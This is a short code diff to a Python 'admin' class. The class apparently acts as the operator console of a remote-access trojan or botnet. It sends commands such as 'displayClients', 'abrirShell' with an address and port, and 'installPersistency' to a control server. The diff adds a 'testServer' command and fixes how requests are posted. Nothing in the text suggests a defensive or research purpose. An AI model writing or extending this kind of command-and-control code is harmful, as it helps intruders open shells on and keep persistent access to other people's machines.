@@ -7,8 +7,8 @@ class admin:
 
     def doRequest(self,json):
         try:
-            r=requests.post(self.addr,json)
-            print(r.json())
+            r=requests.post(self.addr,json=json)
+            print(r.json()['status'])
             return (r.status_code==200)
         except Exception as e:
             print("exception ocurred!",e)
@@ -19,7 +19,6 @@ class admin:
     def displayClients(self):
         json={"CMD":"displayClients"}
         return self.doRequest(json)
-        #return True
 
     def abrirShell(self,uid,addr,port):
         print("displaying clientes!!")
@@ -45,5 +44,10 @@ class admin:
     def install(self,uid=0):
         json={"CMD":"installPersistency","uid":uid}
         self.doRequest(json)
+
+    def testServer(self):
+        json={"CMD":"testServer"}
+        return self.doRequest(json)
+
 
 master=admin()
